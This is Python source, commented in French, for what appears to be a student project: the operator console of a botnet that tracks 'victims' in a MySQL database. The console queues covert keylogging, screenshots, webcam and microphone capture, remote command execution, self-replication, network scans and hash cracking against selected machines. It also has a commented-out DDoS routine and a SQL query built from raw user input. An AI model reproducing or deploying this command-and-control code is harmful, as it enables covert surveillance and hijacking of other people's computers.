import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64
import logging

from env import *
from server import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty
from datetime import datetime

# Arguments
# -h, --help            montre le message d'aide
# -a, --action          permet de sélectionner une action (ex: "ddos", "scan", "shell", "endpoint", "keylogger", "screenshot", "decrypt", "download", "crypto")
# -s, --stop            permet de stopper l'action en cours
# -g, --group           permet de sélectionner un groupe d'ordinateur. Pour séléctionner plusieurs groupes, il faut les séparer par des virgules (ex: "ESGI,PARIS")
# -h, --host            permet de sélectionner un ordinateur. Pour séléctionner plusieurs hosts, il faut les séparer par des virgules (ex: "10.10.10.10,12.12.12.12")
# -lg, --list-group     montre la liste des groupes ordinateurs
# -lh, --list-host      montre la liste des ordinateurs
# -cg, --create-group   créer un groupe d'ordinateurs
# -dg, --delete-group   supprime un groupe d'ordinateur

# python3 main.py -g ESGI,PARIS -a ddos 10.11.12.13
# python3 main.py -h 10.10.10.10 -a shell
# python3 main.py -cg ESGI 100.100.100.100,13.13.13.13

# Initialisation du logger
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler(ROOT_PATH + "botnet.log"),
                              logging.StreamHandler()])

logger = logging.getLogger("botnet")

parser = argparse.ArgumentParser()

# Groupe mutuellement exclusif pour les attaques
action_group = parser.add_mutually_exclusive_group()

# Démarrage du serveur
action_group.add_argument("--start", action="store_true", help="démarre le serveur")

# Arguments spécifiques à l'attaque DDoS
action_group.add_argument("--ddos", action="store_true", help="lance une attaque ddos sur un ordinateur")

# Arguments spécifiques à l'attaque de crack
action_group.add_argument("--crack", action="store_true", help="lance une attaque de crack sur un ordinateur")

# Arguments spécifiques à l'attaque de screenshot
action_group.add_argument("--screenshot", action="store_true", help="lance une capture des fenetres sur un ordinateur")

# Arguments spécifiques à l'attaque de monitor
action_group.add_argument("--monitor", action="store_true", help="lance une capture d'écran sur un ordinateur")

# Arguments spécifiques à l'attaque d'autoréplication
action_group.add_argument("--autorep", action="store_true", help="lance une l'autoréplication sur un ordinateur")

# Arguments spécifiques à l'attaque de picture
action_group.add_argument("--picture", action="store_true", help="lance une capture de la webcam d'un ordinateur")

# Arguments spécifiques à l'attaque de record voice
action_group.add_argument("--record", action="store_true", help="lance un enregistrement audio sur un ordinateur")

# Arguments spécifiques à l'attaque de keylogger
action_group.add_argument("--keylogger", action="store_true", help="lance un keylogger sur un ordinateur")

# Arguments spécifiques à l'attaque force de calcul
action_group.add_argument("--calcul", action="store_true", help="lance une attaque de force de calcul sur un ordinateur")

# Arguments spécifiques à l'attaque command
action_group.add_argument("--command", action="store_true", help="lance une commande sur un ordinateur")


# SQL request
action_group.add_argument("--showall", action="store_true", help="Récupère toutes les informations d'une table donnée")
parser.add_argument("--target", type=str, help="table à afficher")
parser.add_argument("--param", type=str, help="condition de la requête")
parser.add_argument("--value", type=str, help="valeur de la condition")

# Lance un VPN sur une machine précise
action_group.add_argument("--scan", action="store_true", help="Scan le réseau d'une machine précise ou d'un groupe")

# Arguments pour les différentes attaques
parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
parser.add_argument("--port-scan", type=int, help="définit le port à scanner durant l'attaque scan")
parser.add_argument("--port-start", type=int, help="définit le port de départ à scanner durant l'attaque scan")
parser.add_argument("--port-end", type=int, help="définit le dernier port à scanner durant l'attaque scan")
parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à attaquer")
parser.add_argument("--time", type=int, help="temps de l'attaque (ddos/keylogger) en seconde")
parser.add_argument("--hash", type=str, help="hash à cracker")
parser.add_argument("--wordlist", type=str, help="wordlist")

# Gestion des groupes
action_group.add_argument("--list-host", action="store_true", help="Montre la liste des ordinateurs")
action_group.add_argument("--list-group", action="store_true", help="Montre la liste des groupes d'ordinateurs")
action_group.add_argument("--create-group", nargs='+', type=str, help="Créer un groupe d'ordinateurs. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--add-to-group", nargs=2, type=str, help="Ajoute des ordinateurs à un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--remove-from-group", nargs=2, type=str, help="Retire des ordinateurs d'un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--delete-group", type=str, help="Supprime un groupe d'ordinateurs")


# Groupe mutuellement exclusif pour la sélection du groupe ou de l'ordinateur
group_or_host = parser.add_mutually_exclusive_group()
group_or_host.add_argument("-G", "--group", type=str, help="permet de sélectionner un groupe d'ordinateur. Pour sélectionner plusieurs groupes, il faut les séparer par des virgules (ex: 'ESGI,PARIS')")
group_or_host.add_argument("-H", "--host", type=str, help="permet de sélectionner un ordinateur. Pour sélectionner plusieurs hosts, il faut les séparer par des virgules")


args = parser.parse_args()


# Database
db = mysql.connector.connect(
    host=DBHOST,
    user=DBUSER,
    password=DBPASSWORD,
    database=DB
)
mycursor = db.cursor()


# if args.ddos:
#     if not args.address or not args.time or not args.port:
#         logger.error("--ddos nécessite les arguments --address, --time et --port")
#         parser.error("--ddos nécessite les arguments --address, --time et --port")

#     elif not args.host:
#         logger.error("--ddos nécessite l'argument --host")
#         parser.error("--ddos nécessite l'argument --host")
#     elif args.host:
#         try:
#             for victim in args.host.split(","):
#                 query = "SELECT id FROM victims WHERE uid = %s"
#                 values = (victim, )
#                 mycursor.execute(query, values)

#                 result = mycursor.fetchall()
#                 for id in result:
#                     query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
#                     values = (id[0], "ddos", "pending", "{\"arg1\": \"" + str(args.address) + "\", \"arg2\": \"" + str(args.port) + "\", \"arg3\":  \"" + str(args.time) + "\"}")
#                     mycursor.execute(query, values)
#             logger.info("attack:ddos, address:" + args.address + ", port:" + str(args.port) + ", time:" + str(args.time) + ", host:"+ args.host)
#         except mysql.connector.ProgrammingError as e:
#             logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque ddos dans la base de données")
#         except mysql.connector.Error as e:
#             logger.error("Erreur lors de l'insertion de l'attaque ddos dans la base de données")

#     else:
#         parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")

# arg 1 : ip # arg2 : port # arg3 : time  
############################################################


if args.crack:
    if not args.hash or not args.wordlist:
        logger.error("--crack nécessite les arguments --hash et --wordlist")
        parser.error("--crack nécessite les arguments --hash et --wordlist")
    elif not args.host and not args.group:
        logger.error("--crack nécessite l'argument --host et/ou --group")
        parser.error("--crack nécessite l'argument --host et/ou --group")

    logger.info("attack:crack, hash:" + str(args.hash) + ", wordlist:" + str(args.wordlist))
    print("crack du hash '" + str(args.hash) + "' avec la wordlist " + str(args.wordlist))


############################################################


elif args.keylogger:
    if not args.time :
        logger.error("--keylogger nécessite l'argument --time")
        parser.error("--keylogger nécessite l'argument --time")
    elif not args.host:
        logger.error("--keylogger nécessite l'argument --host")
        parser.error("--keylogger nécessite l'argument --host")

    try: 
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "keylogger", "pending", "{\"arg1\": \"" + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")

                mycursor.execute(query, values)
        print("keylogger lancé pour une durée de " + str(args.time) + " secondes sur " + str(args.host))
        logger.info("attack:keylogger, time:" + str(args.time) + ", host:"+ str(args.host))
    except mysql.connector.ProgrammingError as e:
        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque keylogger dans la base de données")
    except mysql.connector.Error as e:
        logger.error("Erreur lors de l'insertion de l'attaque keylogger dans la base de données")


############################################################

elif args.command:
    if not args.host:
        logger.error("--command nécessite l'argument --host")
        parser.error("--command nécessite l'argument --host")
    elif not args.value:
        logger.error("--command nécessite l'argument --value")
        parser.error("--command nécessite l'argument --value")

    try:
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "command", "pending", "{\"arg1\": \"" + str(args.value) + "\", \"arg2\": \"\", \"arg3\": \"\"}")

                mycursor.execute(query, values)
        print("command lancé sur " + args.host)
        logger.info("attack:command, command:" + str(args.value) + ", host:"+ str(args.host))
    except mysql.connector.ProgrammingError as e:
        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque command dans la base de données")
    except mysql.connector.Error as e:
        logger.error("Erreur lors de l'insertion de l'attaque command dans la base de données")

############################################################

elif args.autorep:
    if not args.host : 
        logger.error("--autorep nécessite l'argument --host")
        parser.error("--autorep nécessite l'argument --host")

    try:
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "autorep", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")

                mycursor.execute(query, values)
        print("autorep lancé sur " + args.host)
        logger.info("attack:autorep, host:"+ args.host)
    except mysql.connector.ProgrammingError as e:
        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque autoréplication dans la base de données")
    except mysql.connector.Error as e:
        logger.error("Erreur lors de l'insertion de l'attaque autoréplication dans la base de données")

############################################################

elif args.screenshot:
    if not args.host : 
        logger.error("--screenshot nécessite l'argument --host")
        parser.error("--screenshot nécessite l'argument --host")

    try:
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "screenshot", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")

                mycursor.execute(query, values)
        print("screenshot lancé sur " + args.host)
        logger.info("attack:screenshot, host:"+ args.host)
    except mysql.connector.ProgrammingError as e:
        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque screenshot dans la base de données")
    except mysql.connector.Error as e:
        logger.error("Erreur lors de l'insertion de l'attaque screenshot dans la base de données")

############################################################

elif args.monitor:
    if not args.host : 
        logger.error("--monitor nécessite l'argument --host")
        parser.error("--monitor nécessite l'argument --host")

    try:
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "monitor", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")

                mycursor.execute(query, values)
        print("monitor lancé sur " + args.host)
        logger.info("attack:monitor, host:"+ args.host)
    except mysql.connector.ProgrammingError as e:
        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque monitor dans la base de données")
    except mysql.connector.Error as e:
        logger.error("Erreur lors de l'insertion de l'attaque monitor dans la base de données")

############################################################

elif args.record:
    if not args.host : 
        logger.error("--record nécessite l'argument --host")
        parser.error("--record nécessite l'argument --host")
    elif not args.time:
        logger.error("--record nécessite l'argument --time")
        parser.error("--record nécessite l'argument --time")

    try:
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "record", "pending", "{\"arg1\": \"--time " + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")

                mycursor.execute(query, values)
        print("record lancé pour une durée de " + str(args.time) + " secondes sur " + str(args.host))
        logger.info("attack:record, time:" + str(args.time) + ", host:"+ str(args.host))
    except mysql.connector.ProgrammingError as e:
        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque record dans la base de données")
    except mysql.connector.Error as e:
        logger.error("Erreur lors de l'insertion de l'attaque record dans la base de données")

############################################################

elif args.picture:
    if not args.host : 
        logger.error("--picture nécessite l'argument --host")
        parser.error("--picture nécessite l'argument --host")
    
    try:
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "picture", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")

                mycursor.execute(query, values)
        print("picture lancé sur " + args.host)
        logger.info("attack:picture, host:"+ args.host)
    except mysql.connector.ProgrammingError as e:
        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque picture dans la base de données")
    except mysql.connector.Error as e:
        logger.error("Erreur lors de l'insertion de l'attaque picture dans la base de données")


############################################################

elif args.showall:
    if not args.target:
        parser.error("--showall nécessite l'argument --target")
    elif args.param and not args.value:
        parser.error("--showall nécessite l'argument --value si --param est utilisé")
    elif args.value and not args.param:
        parser.error("--showall nécessite l'argument --param si --value est utilisé")

    query = "SELECT * FROM " + args.target

    if args.param:
        query += " WHERE " + args.param + " = %s"
        values = (args.value, )
    else:
        values = ()

    mycursor.execute(query, values)

    result = mycursor.fetchall()

    if len(result) == 0:
        print("Aucun résultat")
    else:
        for line in result:
            # Formater les objets datetime pour correspondre au format de la base de données
            formatted_line = [
                item.strftime('%Y-%m-%d %H:%M:%S') if isinstance(item, datetime) else item 
                for item in line
            ]
            print(tuple(formatted_line))


############################################################

elif args.scan:
    if not args.host and not args.group:
        logger.error("--scan nécessite l'argument --host et/ou --group")
        parser.error("--scan nécessite l'argument --host ou --group")


    elif args.host and args.group:
        logger.error("--scan nécessite l'argument --host ou --group")
        parser.error("--scan nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")

        
    elif args.host:
        
        try:
            for victim in args.host.split(","):
                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                values = (victim, victim, victim, )
                mycursor.execute(query, values)

                result = mycursor.fetchall()

                for id in result:

                    query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"

                    if args.address:
                        if not args.port_scan and not args.port_start and not args.port_end:
                            values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
                        
                        elif args.port_scan:
                            values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_scan) + "\", \"arg3\": \"\"}")
                        
                        elif args.port_start and args.port_end :
                            values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_start) + "\", \"arg3\": \"--port2 " + str(args.port_end) + "\"}")

                        else:
                            parser.error("mauvaise utilisation de --scan. Veuillez n'utiliser que '--port_scan' ou '--port_start et --port_end'")
                    else:
                        values = (id[0], "scan", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")

                    mycursor.execute(query, values)
            print("lancement du scan sur " + args.host)
            logger.info("attack:scan, host:"+ args.host + ", port_scan:" + str(args.port_scan) + ", port_start:" + str(args.port_start) + ", port_end:" + str(args.port_end))
        except mysql.connector.ProgrammingError as e:
            logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque scan dans la base de données")
        except mysql.connector.Error as e:
            logger.error("Erreur lors de l'insertion de l'attaque scan dans la base de données")

    else:
        parser.error("mauvaise utilisation de --scan. Veuillez vous référer à l'aide")


############################################################

elif args.list_host:
    if args.host:
        parser.error("--list-host n'accepte pas l'argument --host")

    elif args.group:
        print("liste des ordinateurs du groupe " + args.group)

        group_name = args.group


        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        # Récupération des ordinateurs du groupe
        query = "SELECT ip, uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
        values = (group_name, )

        mycursor.execute(query, values)

        result = mycursor.fetchall()
        nb_victims = len(result)

        print("Il y a " + str(nb_victims) + " ordinateurs dans le groupe " + group_name)
        for victim in result:
            print(victim[0] + " - " + victim[1])


    else:
        print("liste des ordinateurs du botnet")

        # Récupération des ordinateurs
        query = "SELECT ip, uid FROM victims"

        mycursor.execute(query)

        result = mycursor.fetchall()
        nb_victims = len(result)

        print("Il y a " + str(nb_victims) + " ordinateur(s) dans le botnet")
        for victim in result:
            victim_groups = get_group_of(uid=victim[1])

            if victim_groups is None:
                print("No group", end="")
            
            else:
                for group in victim_groups:
                    print(group, end=", ")

            print(" - " + victim[0] + " - " + victim[1])


############################################################


elif args.list_group:
    if args.host or args.group:
        parser.error("--list-group n'accepte pas les arguments --host et --group")

    else:
        # Récupération des groupe
        query = "SELECT name FROM groups"

        mycursor.execute(query)

        result = mycursor.fetchall()
        nb_groups = len(result)

        print("Il y a " + str(nb_groups) + " groupe(s) : ")
        for group in result:
            print(group[0])


############################################################


elif args.create_group:
    if args.host or args.group:
        logger.error("--create-group n'accepte pas les arguments --host et --group")
        parser.error("--create-group n'accepte pas les arguments --host et --group")

    else:

        if len(args.create_group) > 2:
            logger.error("--create-group n'accepte que 2 arguments")
            parser.error("--create-group n'accepte que 2 arguments")

        group_name = args.create_group[0]


        if not group_name.isalnum():
            logger.error("Le nom du groupe ne doit contenir que des caractères alphanumériques, group_name: " + str(group_name))
            print("Le nom du groupe ne doit contenir que des caractères alphanumériques")
            exit(1)


        # Vérification de l'existence du groupe
        if group_exists(group_name):
            logger.error("Le groupe existe déjà, group_name: " + str(group_name))
            print("Le groupe existe déjà")
            exit(1)

        try:
            # Création du groupe
            query = "INSERT INTO groups (name, image, created_at, updated_at) VALUES (%s, 'default.png', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
            values = (group_name, )

            mycursor.execute(query, values)

            # Récupération des ordinateurs à ajouter au groupe
            if len(args.create_group) == 2:
                victims_list = []

                for victim in args.create_group[1].split(","):
                    query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                    values = (victim, victim, victim)

                    mycursor.execute(query, values)
                    result = mycursor.fetchall()

                    if len(result) == 0:
                        logger.error("L'ordinateur '" + victim + "' n'existe pas")
                        print("L'ordinateur '" + victim + "' n'existe pas")

                    for id in result:
                        victims_list.append(id[0])


                # Ajout des ordinateurs au groupe
                for victim_id in victims_list:
                    query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                    values = (group_name, victim_id)

                    mycursor.execute(query, values)
            else:
                logger.info("Le groupe a été créé sans ordinateur")
                print("Le groupe a été créé sans ordinateur")
            # Création du groupe
            print("création du groupe " + args.create_group[0])
            logger.info("Création du groupe :" + args.create_group[0])
        except mysql.connector.ProgrammingError as e:
            logger.error("Erreur de syntaxe SQL lors de la création du groupe dans la base de données")
        except mysql.connector.Error as e:
            logger.error("Erreur lors de la création du groupe dans la base de données")


############################################################


elif args.add_to_group:
    if args.host or args.group:
        logger.error("--add-to-group n'accepte pas les arguments --host et --group")
        parser.error("--add-to-group n'accepte pas les arguments --host et --group")

    else:
        

        group_name = args.add_to_group[0]

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            logger.error("Le groupe n'existe pas : " + group_name)
            print("Le groupe n'existe pas")
            exit(1)

        else:

            try:
                # Récupération des ordinateurs à ajouter au groupe
                victims_list = []

                for victim in args.add_to_group[1].split(","):
                    query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                    values = (victim, victim, victim)

                    mycursor.execute(query, values)
                    result = mycursor.fetchall()

                    if len(result) == 0:
                        logger.error("L'ordinateur '" + victim + "' n'existe pas")
                        print("L'ordinateur '" + victim + "' n'existe pas")

                    for id in result:
                        victims_list.append(id[0])


                # Ajout des ordinateurs au groupe
                for victim_id in victims_list:
                    query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                    values = (group_name, victim_id)

                    mycursor.execute(query, values)
                
                logger.info("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])
                print("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])
            except mysql.connector.ProgrammingError as e:
                logger.error("Erreur de syntaxe SQL lors de l'ajout des ordinateurs au groupe" + args.add_to_group[0] + " dans la base de données")
            except mysql.connector.Error as e:
                logger.error("Erreur lors de l'ajout des ordinateurs au groupe" + args.add_to_group[0] + " dans la base de données")
        

          
############################################################
  

elif args.remove_from_group:
    if args.host or args.group:
        logger.error("--remove-from-group n'accepte pas les arguments --host et --group")
        parser.error("--remove-from-group n'accepte pas les arguments --host et --group")

    else:
        
        group_name = args.remove_from_group[0]

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            logger.error("Le groupe n'existe pas : " + group_name)
            print("Le groupe n'existe pas")
            exit(1)

        else:

            try:
                # Récupération des ordinateurs à retirer au groupe
                victims_list = []

                for victim in args.remove_from_group[1].split(","):
                    query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                    values = (victim, victim, victim)

                    mycursor.execute(query, values)
                    result = mycursor.fetchall()

                    if len(result) == 0:
                        print("L'ordinateur '" + victim + "' n'existe pas")

                    for id in result:
                        victims_list.append(id[0])


                # Retrait des ordinateurs au groupe
                for victim_id in victims_list:
                    query = "DELETE FROM victim_groups WHERE victim_id = %s AND group_id = (SELECT id FROM groups WHERE name = %s)"
                    values = (victim_id, group_name)

                    mycursor.execute(query, values)
                
                print("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])
                logger.info("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])
            except mysql.connector.ProgrammingError as e:
                logger.error("Erreur de syntaxe SQL lors de la suppression des ordinateurs du groupe" + args.remove_from_group[0] + " dans la base de données")
            except mysql.connector.Error as e:
                logger.error("Erreur lors de la suppression des ordinateurs du groupe" + args.remove_from_group[0] + " dans la base de données")


############################################################


elif args.delete_group:
    if args.host or args.group:
        logger.error("--delete-group n'accepte pas les arguments --host et --group")
        parser.error("--delete-group n'accepte pas les arguments --host et --group")

    else:
        group_name = args.delete_group

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            logger.error("Le groupe n'existe pas : " + group_name)
            print("Le groupe n'existe pas")
            exit(1)

        else:

            try:   
                # Récupération de l'id du group à supprimer
                group_id = get_group_id(group_name)

                # Suppression du lien victim/group du groupe à supprimer
                query = "DELETE FROM victim_groups WHERE group_id = %s"
                values = (group_id, )

                mycursor.execute(query, values)

                # Suppression du fichier image si ce n'est pas default.png

                ######## à faire

                # Suppression du groupe
                query = "DELETE FROM groups WHERE id = %s"
                values = (group_id, )

                mycursor.execute(query, values)

                print("suppression du groupe " + group_name)
                logger.info("suppression du groupe " + group_name)
            except mysql.connector.ProgrammingError as e:
                logger.error("Erreur de syntaxe SQL lors de la suppression du groupe dans la base de données")
            except mysql.connector.Error as e:
                logger.error("Erreur lors de la suppression du groupe dans la base de données")


############################################################


elif args.start:
    if not args.port or args.port < 1023 or args.port > 65535:
        logger.error("--start nécessite l'argument --port compris entre 1023 et 65535")
        parser.error("--start nécessite l'argument --port compris entre 1023 et 65535")
    else:
        # try:
            start_server(args.port, logger)
            print("démarrage du serveur sur le port " + str(args.port))
            logger.info("démarrage du serveur sur le port " + str(args.port))
        # except:
        #     logger.error("Erreur lors du démarrage du serveur sur le port " + str(args.port))
        #     print("Erreur lors du démarrage du serveur sur le port " + str(args.port))
else :
    parser.error("no action specified. Use -h/--help for help")
db.commit()